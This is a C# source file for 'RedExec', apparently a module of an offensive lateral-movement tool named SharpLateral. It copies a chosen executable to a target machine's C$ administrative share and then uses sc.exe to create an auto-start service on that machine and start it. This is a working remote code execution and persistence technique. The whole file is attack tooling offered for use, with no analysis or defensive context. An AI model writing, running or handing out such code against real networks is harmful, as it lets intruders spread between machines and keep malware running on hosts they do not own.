using System;
using System.Diagnostics;
using System.IO;

namespace SharpLateral
{
    class RedExec
    {
        public static void Redexec(string[] args)
        {
            if (args.Length < 4)
            {
                Console.WriteLine("Usage: SharpLateral.exe redexec 192.168.31.134 C:\\Users\\Administrator\\Desktop\\d.exe d.exe servicename");
                return;
            }

            string remoteMachineName = args[0];
            string localFilePath = args[1];
            string remoteFilePath = args[2];
            string serviceName = args[3];

            // Copy the file to the remote machine
            if (CopyFileToRemote(remoteMachineName, localFilePath, remoteFilePath))
            {
                Console.WriteLine("File copied successfully.");

                // Create the service, set binary path, and start it
                CreateAndStartService(remoteMachineName, serviceName, remoteFilePath);
            }
            else
            {
                Console.WriteLine("Error copying the file to the remote machine.");
            }
        }

        static bool CopyFileToRemote(string remoteMachineName, string localFilePath, string remoteFilePath)
        {
            try
            {
                // Combine the remote machine name and remote file path
                string remotePath = $@"\\{remoteMachineName}\c$\{remoteFilePath}";

                // Copy the file to the remote machine
                File.Copy(localFilePath, remotePath, true);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error copying the file to the remote machine: " + ex.Message);
                return false;
            }
        }

        static void CreateAndStartService(string remoteMachineName, string serviceName, string remoteFilePath)
        {
            try
            {
                // Use sc.exe to create and configure the service
                Process process = new Process();
                process.StartInfo.FileName = "sc.exe";
                process.StartInfo.Arguments = $@"\\{remoteMachineName} create {serviceName} binPath= ""C:\{remoteFilePath}"" start= auto";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;

                process.Start();
                process.WaitForExit();

                string output = process.StandardOutput.ReadToEnd();
                process.Close();

                Console.WriteLine(output);
                Console.WriteLine("Service created successfully.");

                // Start the service
                StartService(remoteMachineName, serviceName);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error creating the service: " + ex.Message);
            }
        }

        static void StartService(string remoteMachineName, string serviceName)
        {
            try
            {
                // Use sc.exe to start the service
                Process process = new Process();
                process.StartInfo.FileName = "sc.exe";
                process.StartInfo.Arguments = $@"\\{remoteMachineName} start {serviceName}";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;

                process.Start();
                process.WaitForExit();

                string output = process.StandardOutput.ReadToEnd();
                process.Close();

                Console.WriteLine(output);
                Console.WriteLine("Service started successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error starting the service: " + ex.Message);
            }
        }
    }
}